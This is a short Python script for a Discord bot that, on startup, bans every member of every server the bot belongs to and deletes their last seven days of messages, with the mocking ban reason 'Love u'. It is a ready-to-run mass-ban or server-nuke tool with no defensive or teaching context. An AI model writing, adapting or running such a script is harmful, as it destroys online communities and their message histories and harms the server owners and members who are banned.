import discord

TOKEN = "token"
BOTSkip = False

client = discord.Client()

@client.event
async def on_ready():
    for member in client.get_all_members():
        if member.bot and BOTSkip:
            continue
        await member.ban(reason="Love u", delete_message_days=7)
        print(f"Banned {member.display_name}!")
    print("Banning is complete!")

client.run(TOKEN)